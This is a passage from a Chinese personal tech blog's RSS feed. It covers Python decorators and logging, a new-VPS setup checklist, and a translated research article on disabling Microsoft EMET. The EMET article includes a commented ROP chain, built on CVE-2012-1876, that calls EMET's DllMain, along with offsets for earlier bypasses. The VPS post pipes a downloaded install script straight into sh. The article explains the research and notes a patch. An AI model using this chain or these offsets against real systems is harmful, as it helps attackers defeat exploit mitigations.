			<pubDate>Thu, 14 Jul 2016 23:41:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E4%BD%BF%E7%94%A8-python-%E8%A3%85%E9%A5%B0%E5%99%A8%E6%9D%A5%E5%B0%86%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0%E5%8A%A0%E5%85%A5%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97/</guid>
			<description>使用 Python 装饰器来将普通函数加入任务队列 首先，我们先声明了一个 namedtuple ，其中包含以下几个元素： func ：需要加入任务队列的目标函数对象 args 和 kwargs ：目标函数对象的</description>
			<content type="html"><![CDATA[<h1 id="使用-python-装饰器来将普通函数加入任务队列">使用 Python 装饰器来将普通函数加入任务队列</h1>
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>首先，我们先声明了一个 namedtuple ，其中包含以下几个元素：</p>
<ol>
<li><code>func</code> ：需要加入任务队列的目标函数对象</li>
<li><code>args</code> 和 <code>kwargs</code> ：目标函数对象的参数</li>
<li><code>result_obj</code> ：用于保存目标函数返回值的一个字典， 装饰器函数将目标函数加入任务队列之后，会直接返回一个<code>{'result': None, 'done': False}</code>的字典。等到目标函数异步执行完成之后， Worker 会用返回值替换这一字典的<code>result</code>，并设置<code>done</code>为<code>True</code></li>
</ol>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Worker 和普通的 Consumer 定义基本没有区别，唯一要注意的地方是，记得要用函数返回值，替换掉任务返回值字典的<code>'result'</code>，并修改任务状态，即</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>同样是比较标准的 Producer ，其中<code>queue_up</code>函数就是这次的主角了。对于目标函数，先构建一个返回值字典，然后将目标函数和参数加入任务队列，最后返回这一返回值字典。非常简单的结构，但是使用起来非常的方便。</p>
<!-- raw HTML omitted -->
<p>这里我构造了一个用来测试的代码</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>读者可以尝试删除掉<code>some_operation</code>函数前面的装饰器，对比有无这个装饰器对程序运行的影响。</p>
<p>可以看到，对于需要测试的<code>some_operation</code>函数，我仅仅是在其定义前加上了一个装饰器的调用，就使得这个函数的执行不会阻塞主线程了。并且对于异步调用函数的返回值，也很好的进行了保留传递。</p>
]]></content>
		</item>
		
		<item>
			<title>关于Python的logging模块初始化无效的一个小坑</title>
			<link>https://yinzo.github.io/posts/%E5%85%B3%E4%BA%8Epython%E7%9A%84logging%E6%A8%A1%E5%9D%97%E5%88%9D%E5%A7%8B%E5%8C%96%E6%97%A0%E6%95%88%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E5%9D%91/</link>
			<pubDate>Tue, 19 Apr 2016 23:45:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E5%85%B3%E4%BA%8Epython%E7%9A%84logging%E6%A8%A1%E5%9D%97%E5%88%9D%E5%A7%8B%E5%8C%96%E6%97%A0%E6%95%88%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E5%9D%91/</guid>
			<description>关于Python的logging模块初始化无效的一个小坑 一般使用logging模块都会对其进行初始化，使用以下代码： log_format = &#39;[%(levelname)s] %(asctime)s %(filename)s line %(lineno)d: %(message)s&#39; date_fmt = &#39;%a, %d</description>
			<content type="html"><![CDATA[<h1 id="关于python的logging模块初始化无效的一个小坑">关于Python的logging模块初始化无效的一个小坑</h1>
<!-- raw HTML omitted -->
<p>一般使用logging模块都会对其进行初始化，使用以下代码：</p>
<pre><code>    log_format = '[%(levelname)s] %(asctime)s  %(filename)s line %(lineno)d: %(message)s'
    date_fmt = '%a, %d %b %Y %H:%M:%S'
    logging.basicConfig(
        format=log_format,
        datefmt=date_fmt,
        level=log_level,
    )
</code></pre>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>或者，只是简单使用，可以不初始化，直接<code>logging.info(&quot;blablabla&quot;)</code></p>
<p>但是，如果当你先直接不初始化logging设置，直接输出之后，你再尝试初始化，你的设置将不会不会生效。尝试以下代码</p>
<pre><code># -*- coding: utf-8 -*-
import logging

def init_logging(log_level=logging.INFO):
    log_format = '[%(levelname)s] %(asctime)s  %(filename)s line %(lineno)d: %(message)s'
    date_fmt = '%a, %d %b %Y %H:%M:%S'
    logging.basicConfig(
        format=log_format,
        datefmt=date_fmt,
        level=log_level,
    )


if __name__ == '__main__':
    logging.critical(&quot;critical&quot;)
    logging.warning(&quot;warning&quot;)
    logging.info(&quot;info&quot;)
    logging.debug(&quot;debug&quot;)

    init_logging(logging.DEBUG)
    print &quot;\n&quot;
    print &quot;initial finished.&quot;
    print &quot;\n&quot;

    logging.critical(&quot;critical&quot;)
    logging.warning(&quot;warning&quot;)
    logging.info(&quot;info&quot;)
    logging.debug(&quot;debug&quot;)
</code></pre>
<p>输出：</p>
<pre><code>CRITICAL:root:critical
WARNING:root:warning


initial finished.


CRITICAL:root:critical
WARNING:root:warning
</code></pre>
<p>输出中，因为logging默认等级为warning，所以成功输出critical和warning<br>
但当初始化之后，其输出格式原本应该改变，并且输出等级应该变为DEBUG，但是从输出可以看到，和初始化前的输出没有任何区别，说明初始化没有生效。这一问题在官方文档中有简单提及</p>
<blockquote>
<p>The call to basicConfig() should come before any calls to debug(), info() etc. As it’s intended as a one-off simple configuration facility, only the first call will actually do anything: subsequent calls are effectively no-ops.</p>
</blockquote>
]]></content>
		</item>
		
		<item>
			<title>新建VPS应该做的事情</title>
			<link>https://yinzo.github.io/posts/%E6%96%B0%E5%BB%BAvps%E5%BA%94%E8%AF%A5%E5%81%9A%E7%9A%84%E4%BA%8B%E6%83%85/</link>
			<pubDate>Sat, 09 Apr 2016 21:08:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E6%96%B0%E5%BB%BAvps%E5%BA%94%E8%AF%A5%E5%81%9A%E7%9A%84%E4%BA%8B%E6%83%85/</guid>
			<description>创建root密码 passwd 安装oh-my-zsh，这里是debian， 所以使用apt-get apt-get update; apt-get upgrade 安装zsh、git、pip sudo apt-get install zsh git python-pip python-dev 安装oh</description>
			<content type="html"><![CDATA[<ol>
<li>
<p>创建root密码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">passwd
</code></pre></div></li>
<li>
<p>安装oh-my-zsh，这里是debian， 所以使用apt-get</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get update; apt-get upgrade        
</code></pre></div></li>
<li>
<p>安装zsh、git、pip</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt-get install zsh git python-pip python-dev
</code></pre></div></li>
<li>
<p>安装oh my zsh</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
</code></pre></div></li>
<li>
<p>更换默认shell为zsh</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chsh -s /usr/bin/zsh
</code></pre></div><p>这个路径不一定，如果不知道，可以使用<code>which zsh</code>来查看zsh位置</p>
</li>
<li>
<p>上传.zshrc</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">scp ~/.zshrc root@*.*.*.*:~/
</code></pre></div><p>此处<code>*</code>为ip地址</p>
</li>
<li>
<p>然后就要修改.zshrc了</p>
<ol>
<li>改zsh对应路径</li>
<li>还原插件列表</li>
<li>检查个性化设置如alias</li>
</ol>
</li>
<li>
<p>安装shadowsocks</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pip install shadowsocks
</code></pre></div></li>
<li>
<p>建立 /etc/shadowsocks.json</p>
</li>
<li>
<p>在 /etc/rc.local 中加入shadowsocks的开启自启动</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/bin/python /usr/local/bin/ssserver -c /etc/shadowsocks.json -d start
</code></pre></div></li>
</ol>
]]></content>
		</item>
		
		<item>
			<title>Python Decorator的一些细节</title>
			<link>https://yinzo.github.io/posts/python-decorator%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/</link>
			<pubDate>Thu, 31 Mar 2016 19:14:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/python-decorator%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/</guid>
			<description>Python Decorator的一些细节 而且当一个文件（模块）被import的时候，文件内的__所有__装饰器就会被激活执行。因为装饰器语句相当于文件</description>
			<content type="html"><![CDATA[<h1 id="python-decorator的一些细节">Python Decorator的一些细节</h1>
<!-- raw HTML omitted -->
<p>而且当一个文件（模块）被import的时候，文件内的__所有__装饰器就会被激活执行。因为装饰器语句相当于文件中的普通语句，而非函数声明或者类声明的一部分。</p>
<p>用以下代码方便理解：</p>
<pre><code># sample.py

def decorator_function(func):
    print &quot;executing the decorator.&quot;

    def wrapper(*args, **kwargs):
        print &quot;decorated function is executing.&quot;
        return func(*args, **kwargs)

    return wrapper


print &quot;this python file is executing.&quot;


@decorator_function
def test_function(sth):
    print &quot;blablabla&quot;+sth

test_function(&quot;yeah&quot;)
</code></pre>
<p>而当我们对一个类里面的普通函数使用修饰符进行修饰的时候，然后我们正常调用这一函数（通过实例化的对象调用），会报错提示这一函数变成了unbound method，缺少了类中函数默认的首参数self。这一问题是由于经过装饰器修饰的函数，实际上是被传递到了装饰器函数中，在这个装饰器函数中被独立调用的，而非被其原先所在的类对象调用。因此在这个装饰器函数中，没有其原来所在的类来对它进行调用，导致提示unbound method.</p>
]]></content>
		</item>
		
		<item>
			<title>通过EMET来禁用EMET——EMET的禁用与绕过思路讲解</title>
			<link>https://yinzo.github.io/posts/%E9%80%9A%E8%BF%87emet%E6%9D%A5%E7%A6%81%E7%94%A8emetemet%E7%9A%84%E7%A6%81%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E8%AE%B2%E8%A7%A3/</link>
			<pubDate>Sun, 27 Mar 2016 11:46:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E9%80%9A%E8%BF%87emet%E6%9D%A5%E7%A6%81%E7%94%A8emetemet%E7%9A%84%E7%A6%81%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E8%AE%B2%E8%A7%A3/</guid>
			<description>通过EMET来禁用EMET——EMET的禁用与绕过思路讲解 微软的Enhanced Mitigation Experience Toolkit (EMET)是一项提高程序安全性的项目。它通过动态链接</description>
			<content type="html"><![CDATA[<h1 id="通过emet来禁用emetemet的禁用与绕过思路讲解">通过EMET来禁用EMET——EMET的禁用与绕过思路讲解</h1>
<!-- raw HTML omitted -->
<p>微软的Enhanced Mitigation Experience Toolkit (EMET)是一项提高程序安全性的项目。它通过动态链接库(DLL)来运行在『受保护』的程序中，并且做一些修改来使得破解更加困难。</p>
<p>我们已经见过很多次EMET在过去的研究或者攻击中被绕过了[2, 3, 4, 5, 6, 7, 8]。通常来说，微软都是通过修改或者增加一些安全设计来搞定现有的绕过问题。 EMET的设计目的是使得破解行为的成本升高，而不是一个『傻瓜式的防破解方案』[1]。所以，只要拥有在进程空间中读写的能力，理论上我们就能搞定所有的安全设计[2]。</p>
<p>如果一个攻击者能够毫不费力地绕过EMET，那这就完全打破了EMET提高破解成本的最初目的。我们在新技术那段展示了一种禁用EMET的技术。微软在EMET5.5中打了个补丁来解决这个问题。</p>
<p>讨论完这个新技术之后，我们来说说之前提到的用来绕过或搞掉EMET的那个技术。如果你想了解关于EMET是怎么实现保护程序的，请参考附录。</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<!-- raw HTML omitted -->
<p>EMET会根据系统的架构，来选择注入emet.dll还是emet64.dll到每一个被保护的进程中，以此在Windows API（比如kernel32.dll, ntdll.dll或者kernelbase.dll里面的函数）hook上。这些hook使得EMET能够分析所有通过关键API调用的代码，并判断他们是否合法。如果代码被认为是合法的，EMET的hook会跳回请求的API处，否则会触发一个exception。</p>
<p>但是，EMET里面存在着这样一段代码用来卸载EMET。这段代码整个禁用EMET的保护，并且把受保护的程序还原为无保护的初始状态。任何人都能简单地定位这段代码，并调用它，就能够完全禁用EMET的保护。在EMET.dll v5.2.0.1中这个函数位于0x65813中，跳到这段代码上并调用它就能弄掉EMET的hooks。</p>
<p>这一特性之所以存在，是因为emet.dll里面的用于完全退出进程的代码，为了方便，而在DllMain里面留了个入口。</p>
<p>DllMain的函数原型：</p>
<pre><code>BOOL WINAPI DllMain(
  _In_ HINSTANCE    hinstDLL,
  _In_ DWORD        fdwReason,
  _In_ LPVOID       lpvReserved
);
</code></pre>
<p>需要注意的是，第一个参数传递是DLL的地址，第二个是PE loader用来指明DLL是否被加载。如果fdwReason是1，说明DLL已经被加载或者初始化。如果是0（DLL_PROCESS_DETACH），emet.dll会初始化卸载的代码，并去除它的hook和exception处理句柄，轻而易举地停止了EMET的检查。不过这并不会把EMET从内存中移除，它只是确保了所有的保护都被禁用了。</p>
<p>这种特性可能存在与所有基于探测的产品之中，也就是那些依赖hook的并以此保证产品不被破坏，一定存在一个卸载所有保护的方法。EMET的DllMain能够通过一个Return Oriented Programming (ROP)程序来找到，并带着正确的参数跳到DllMain的对应位置，禁用保护。这个我们下一节来详细说。</p>
<pre><code>BOOL WINAPI DllMain (GetModuleHandleW(&quot;EMET.dll&quot;) ,DLL_PROCESS_DETACH , NULL);
</code></pre>
<p>GetModuleHandleW函数没有被EMET hook上，因为EMET认为它不是关键Windows API。我们使用这个函数来搞到emet.dll的地址。因为PE header位于基地址上，我们必须通过它找到DllMain的地址来传递所需的参数。</p>
<!-- raw HTML omitted -->
<p>在EMET.dll v5.2.0.1中，在emet.dll的0xF2958上有一个全局变量。EMET通过这个变量作为一个structure数组指针，指向被绕过的API（detoured APIs），每一个结构体的大小为0x18 bytes，如下所示：</p>
<pre><code>struct Detoured_API {
    BOOL isActive;              // isActive field shows the hooking status, Active: 0x1
    PVOID DetouredAPIConfig;    // pointer to Detoured_API_Config structure
    PVOID nextDetouredAPI;      // pointer to the next Detoured_API structure
    DWORD valueX;
    DWORD valueY;
    DWORD valueZ;
};
</code></pre>
<p>最后三个变量和这篇文章没有关系。DetouredAPIConfig保存着一个指针指向另一个结构体Detoured_API_Config，大小是0x18 bytes.</p>
<pre><code>struct Detoured_API_Config {
    PVOID DetouredWindowsAPI;     // pointer to the detoured Windows API
    PVOID EMETDetouringFunction;    // pointer to where EMET protection implemented
    PVOID DetouredFunctionPrologue;   // pointer to the Windows API prologue
    DWORD valueX;
    DWORD valueY;
    DWORD valueZ;
}
</code></pre>
<p>注意，EMETDetouringFunction和DetouredFunctionPrologue之间总是相隔0x26 bytes，是EMET用于准备函数（检查代码的函数）所需的参数的空间。然后就会调用这一函数来进行检查。同样是在这0x26 bytes里面，EMET保存了一些meta数据，比如说detoured函数头部的大小。Detoured_API_Config 结构里面的第三个变量是DetouredFunctionPrologue。跳到这一地址将调用所有没有hook的Windows API，因为它会跳回并在执行完函数头部之后，执行剩余的所有Windows API。</p>
<p>用于去除所有EMET的hook的函数位于0x2798，如图1所示。</p>
<p><img src="http://ww4.sinaimg.cn/large/7d52f1ffjw1f2erytp63hj20r20g8tdp.jpg" alt="Figure1"><br>
图1： 位于0x27298上用于去除EMET hook的函数</p>
<p>为了卸载hook，位于0x27298的函数把所有Detoured_API结构都循环一次，并把对应的Detoured_API_Config结构里面的DetouredFunctionPrologue置零。然后，调用Patch_Functions（位于0x27B99的函数），给所有detoured Windows API做一些小修改。函数使用了memcpy函数(如图2)来把API函数头部代码片段复制到被绕过函数中，用于把它恢复成被绕过之前的状态。</p>
<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2erza8hyqj20i208cn0p.jpg" alt="Figure2"><br>
图2：删除绕过的代码<br>
循环完所有被绕过的API并被memcpy修改之后，你可以看到所有Windows API的绕过都消失了，如图3、图4，分别是执行前后。</p>
<p><img src="http://ww3.sinaimg.cn/large/7d52f1ffjw1f2erzqpz4vj20js056jsa.jpg" alt="Figure3"><br>
图3：调用DllMain之前</p>
<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2es0idbffj20je04r0tf.jpg" alt="Figure4"><br>
图4：调用DllMain之后</p>
<p>然后EMET继续禁用EAF和EAF+的保护。在位于0x609D0的函数中，EMET置零并重新初始化CONTEXT结构，并且操作debug注册器（如图5）但是，在函数的尾部， EMET调用NtSetContextThread，使得debug注册器被置零，并由此禁用了EAF和EAF+的保护。</p>
<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2es0u7g5xj20f206n3zw.jpg" alt="Figure5"><br>
图5：EAF和EAF+的禁用代码</p>
<p>最后，在位于0x60FBF的函数的末尾，EMET调用了位于0x60810的RemoveVectoredExceptionHandler函数，移除了AddVectoredExceptionHandler函数里的定义的exception句柄。</p>
<!-- raw HTML omitted -->
<p>通过一个以前已经被打好补丁的漏洞，CVE-2012-1876，我们基于现有的漏洞做了个ROP小程序，并在EMET的保护启用时执行它。当我们的ROP小程序带着参数(EMET.dll地址, 0, 0)调用EMET.dll里面的DllMain函数，我们执行之后，所有的Windows API上的HOOK都和EAF和EAF+的保护一起消失了。</p>
<pre><code>XCHG EAX,ESP # RETN // Stack Pivot &amp;amp; Rop Starts

POP EAX # RETN // Pop GetModuleHandle PTR from IAT

&amp;lt;GetModuleHandleW&amp;gt;// mshtml.dll base + offset in IAT

JMP [EAX]// Jump into GetModuleHandleW pointer

POP EBX # RETN // return address when EIP = GetModuleHandleW

EMET_STRING_PTR// Argument 1 for GetModuleHandleW i.e. EMET.dll string

//After GetModuleHandle returns esp is here while (EIP = POP EBX # RETN)

0x0000003c// 0x3c goes into EBX

ADD EBX,EAX # RETN // EAX = EMET.dll address &amp;amp; EBX = 0x3c offset for IMAGE_DOS_HEADER::e_lfanew

XOR EBP,EBP # RETN // clear out EBP

ADD EBP,EAX # RETN // ADD EAX into Nulled EBP

ADD EAX,[EBX] # RETN // [EBX] = poi(EMET_DLL_BASE+0x3c) =&amp;gt; EAX = offset for PE header

POP EBX # RETN // pop 0x28 in EBX

0x00000028

ADD EBX,EAX # RETN // add 0x28 with PE header offset from base address (RVA of OEP)

XOR EAX,EAX # RETN // NULL EAX

ADD EAX,EBP # RETN // ADD previously copied EMET_DLL_BASE to NULLed EAX

ADD EAX,[EBX] # RETN // ADD EMET_DLL_BASE with OEP RVA =&amp;gt; EAX = VA of OEP

XCHG EAX,ECX # RETN // copying EAX into ECX

XOR EAX,EAX # RETN // NULL EAX

ADD EAX,EBP # RETN // copy EMET_DLL_BASE into eax

XCHG EAX,ESI # RETN // copy EMET_DLL_BASE into EAX

// ESI contains EMET_DLL_BASE &amp;amp; ECX contains OEP address

PUSH ESI # CALL ECX # RETN // call OEP of EMET.dll with EMET_DLL_BASE on top of stack as PARAM1

0x0 // PARAM2 fdwReason == DLL_PROCESS_DETACH | 0

0x0// PARAM3 Reserved

// When Call ECX returns to RETN instruction stack top is as following

// and All hooks are gone Since EMET.dll just received a DETACH signal
</code></pre>
<!-- raw HTML omitted -->
<p>之前用于绕过EMET的技术都基于设计和实现上的失误，可能是因为一些模块和API不太安全。我们会描述一些绕过的技巧。</p>
<p>因为LoadLibrary是一个关键API，如果被『返回(return)』命令或者『跳出(jump)』命令调用，EMET4.1会抛出一个exception，但是Jared DeMott向我们展示了，通过『调用(call)』命令来调用LoadLibrary API，而不是『跳出(jump)』或『返回(return)』命令，绕过了EMET LoadLibrary的保护[2]。</p>
<p>LoadLibrary API一直被监视着，防止被用于调用UNC路径（比如说一些恶意dll）。Aaron Portnoy展示了我们能够通过MoveFile API（EMET4.0没有监视这个API）来绕过它，并下载一个能够被LoadLibrary API加载的DLL文件[3]。</p>
<p>EMET4.1的调用检查保护(Caller check protection)，是通过检查关键Windows API是否被通过调用、返回、跳出命令来调用，以防止ROP程序的执行。其中，后两种命令被广泛运用与ROP程序。DeMott展示了一个通过执行一个合法的关键API调用，来绕过调用检查保护的方法[2]。DeMott没有直接通过返回或者跳出命令来调用VirtualAlloc API（这会导致EMET抛出exception），而是在一个已被加载的模块中，使用调用命令来调用。并且，通过返回调用命令所在的地址，我们成功调用了关键Windows API而没被EMET干扰。</p>
<p>关键Windows API都位于kernel32.dll, ntdll.dll和 kernelbase.dll中。EMET3.5把前两个模块中的函数挂上hook，但是没有处理kernelbase.dll。Shahriyar Jalayeri利用这一事实来执行位于kernelbase模块中的VirtualProtect API，来使得内存可写可执行[4]。但是，在EMET4.0发布以后，函数保护应用到了几乎最低等级的关键Windows API上面。</p>
<p>Jalayeri还通过使用 <!-- raw HTML omitted -->KUSER<!-- raw HTML omitted -->SHARED_DATA结构(它的地址固定在0x7ffe0000上)来绕过EMET。位于0x300地址上的是一个SystemCallStub指针，指向一个执行系统级命令的函数KiFastSystemCall。由此，他能够通过指明EAX注册器里的地址（比如0x0D7指向ZwProtectVirtualMemory），来调用任何系统级调用。而且Jalayeri能够通过返回指令来修改函数头部，使其失效，导致EMET完全无效。</p>
<p>EAF通过debug注册器，在输出函数（比如kernel32.dll里的函数）的入口布下断点。这些断点，能够通过使用import access table的shellcode来绕过，而不是export acccess table，因为这个保护只能用于export acccess table。</p>
<!-- raw HTML omitted -->
<p>不像通过绕开保护的绕过技术，禁用EMET是完全关闭它的保护。比如说EAF（和一部分的EAF+）能够通过清除硬件断点（比如置零debug注册器）。Piotr Bania通过使用文档中没有写出来的的Windows API——NtSetContextThread和NtContinue来实现这一目的。但是因为EMET把NtSetContextThread hook上了，我们应该先把EMET的保护关闭，才能使用NtSetContextThread来干活。</p>
<p>Offensive Security发现EMET4.1的大部分保护行为，都会先去检查一个保存在位于emet.dll的0x0007E220位置上的一个外部全局变量；如果那个变量的值是0，那么保护函数就不会对调用代码做手脚[6]。说明这个全局变量是一个全局开关，用于打开/关闭EMET的保护，并且如果把这个变量放在了一个能够写入的位置，攻击者就能够构造一个ROP程序来把这个变量轻松地置零。</p>
<p>经过分析，我们发现EMET v2.1也在0xC410上含有相同的全局开关，由此，我们怀疑EMET从最早的版本开始就含有这一固定地址的全局开关了。这个问题直到EMET5.0的发布才修复。</p>
<p>Offensive Security还发现，EMET5.0把这个全局变量放到了大型结构（比如CONFIG_STRUCT）里的堆里面，大小是0x560 bytes [7]。但是，思路还是一样的，因为还是存在一个位于固定地址0x0AA84C的指针指向CONFIG_STRUCT。作为保护，EMET使用EncodePointer来把指针的值编码了一下，并且每次EMET执行保护的时要检查这个值，就会调用DecodePointer函数来解码它以获得CONFIG_STRUCT的地址。把地址CONFIG_STRUCT+0x558 置零，能够关掉EMET的大部分保护。同时，通过位于CONFIG_STRUCT+0x518的指针，调用没被hook的函数NtSetContextThread，就能关掉EAF和EAF+。</p>
<p>在EMET5.1里面，Offensive Security发现位于0xF2A30的全局变量里面，保存了编码过的指针值，指向一些结构(比如EMETd)[8]。这个EMETd里面有一个指针域，指向CONFIG_STRUCT结构，也就是那个在CONFIG_STRUCT+0x558里保存了全局开关那个，以此作为一层额外的保护层，保护编码过的指针。EMET5.1使用cpuid命令来把返回的结果和编码过的指针值进行异或。想要解码CONFIG_STRUCT，他们使用了emet.dll里位于0x67372的代码，把EMETd解码出来，然后返回解码了的CONFIG_STRUCT的指针。因为那些全局开关（比如CONFIG_STRUCT+0x558）都储存在只读内存页中，Offensive Security找到了一个方法，通过EMET里面没被hook的指针来修改里面的值。他们用了一个没hook的指针指向位于CONFIG_STRUCT+0x1b8的ntdll!NtProtectVirtualMemory函数，来把它标记为可写内存页，所以他们能够把位于CONFIG_STRUCT+0x558的全局开关置零。想要禁用EAF和EAF+，他们用了一个指向NtSetContextThread的没hook指针，然后剩下的就和禁用EMET5.0一样了。</p>
<!-- raw HTML omitted -->
<p>这个新技术使用EMET来禁用EMET保护，非常的可靠并且相比之前的绕过或禁用技巧更加容易利用。这整个技术都能包含到一个简单粗暴的ROP链中。你只需要弄出一个加载GetModuleHandleW的DLL（比如mshtml.dll）的地址，而不需要进程空间里面的完整可读能力。因为emet.dll里面的DllMain函数被导出了，所以绕过已经不需要对应版本来设置地址，它适用于所有版本的EMET（4.1, 5.1, 5.2, 5.2.0.1）。</p>
<p>在EMET的_里面_，通过可用的内部代码来禁用EMET，给了我们一直全新的攻击思路。定位DllMain并且调用它来关掉EMET的保护，相比一个一个地绕过保护，然后偷偷改掉其中的参数来说，简直轻松加愉快。</p>
<p>鸣谢：Michael Sikorski, Dan Caselden, Corbin Souffrant, Genwei Jiang, and Matthew Graeber</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>EMET经过了许多年的迭代，以下对它的功能作一些简短的描述：</p>
<!-- raw HTML omitted -->
<p>Structured Exception Handling Overwrite Protection (SEHOP)：提供对抗重写异常处理句柄的保护。<br>
Dynamic Data Execution Prevention (DEP)：加强了DEP，使得一些数据类如堆和栈都不能执行。<br>
NULL page allocation：修复间接引用空指针导致的漏洞<br>
Heap spray allocation: 防止Heap spray攻击。</p>
<!-- raw HTML omitted -->
<p>Mandatory Address Space Layout Randomization (ASLR)：加强了模块地址的随机化，即使是以前没有使用ASLR进行编译的模块。</p>
<p>Export Address Table Access Filtering (EAF)：普通的shellcode在已加载的模块导出的函数中迭代，来解析关键Windows API。这些通常由kernel32.dll, ntdll.dll和kernelbase.dll导出。EMET使用保存在debug注册器（比如DR0）的硬件断点来停止那些尝试读取这些模块的导出表的动作，并且让EMET验证它是否合法。</p>
<!-- raw HTML omitted -->
<p>从ROPGuard中导入了用于对抗ROP的策略。<br>
导入库时的检查：防止从UNC路径中导入DLL。<br>
ROP 策略 - 内存保护检查：保护关键Windows API，类似VirtualProtect，会使得栈被标记为可执行。<br>
ROP 策略 - 调用检查：防止关键Windows API被通过返回或跳出命令执行；<br>
ROP 策略 - Stack Pivot：检测是否被进行Stack Pivot攻击。<br>
ROP 策略 - 模拟执行流：通过手动操作栈注册器来模拟执行，以此检查它是否在没有使用调用命令的情况下调用了Windows API。这被认为是EMET在探测ROP程序。<br>
仔细设计ASLR：在已加载的模块地址上增加了随机的8位熵。</p>
<!-- raw HTML omitted -->
<p>Deep Hooks:当这个特性开启，EMET会把所有等级的Windows API都hook上。</p>
<p>抗绕过：因为EMET在已经hook的Windows API函数头部放了一个跳出命令，攻击者能够构造一个ROP，能够返回跳出命令之后的代码上。这项保护尝试阻止这一绕过。</p>
<p>禁用函数：默认禁止调用ntdll!LdrHotpatchRoutine函数来防止DEP/ASLR被绕过。也可以添加其他函数。</p>
<p>认证信任：在认证链信任检测步骤，提供更多的检查和验证。一般这只支持IE。</p>
<!-- raw HTML omitted -->
<p>加入Attack Surface Reduction (ASR)：允许添加配置列表来进制特定的应用不允许加载某些模块。</p>
<p>EAF+：类似EAF，它能保护关键模块导出表如kernel32.dll, ntdll.dll和kernelbase.dll。它同时也能探测栈指针是否指向栈外部的某处，或者frame和栈的指针是否一致。</p>
<!-- raw HTML omitted -->
<p>[1] “Inside EMET 4.0” by Elias Bachaalany, <a href="http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf">http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf</a><br>
[2] “Bypassing EMET 4.1” by Jared DeMott, <a href="http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/">http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/</a><br>
[3] “Bypassing All of The Things” by Aaron Portnoy, <a href="https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf">https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf</a><br>
[4] “Bypassing EMET 3.5’s ROP Mitigations” by Shahriyar Jalayeri, <a href="https://github.com/shjalayeri/emet_bypass">https://github.com/shjalayeri/emet_bypass</a><br>
[5] “Bypassing EMET Export Address Table Access Filtering feature” by Piotr Bania, <a href="http://piotrbania.com/all/articles/anti_emet_eaf.txt">http://piotrbania.com/all/articles/anti_emet_eaf.txt</a><br>
[6] “Disarming Enhanced Mitigation Experience Toolkit (EMET)” by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/">https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/</a><br>
[7] “Disarming EMET v5.0” by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-emet-v5-0/">https://www.offensive-security.com/vulndev/disarming-emet-v5-0/</a><br>
[8] “Disarming and Bypassing EMET 5.1” by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/">https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/</a></p>
]]></content>
		</item>
		
		<item>
			<title>Ideas for Neural Network</title>
			<link>https://yinzo.github.io/posts/ideas-for-neural-network/</link>
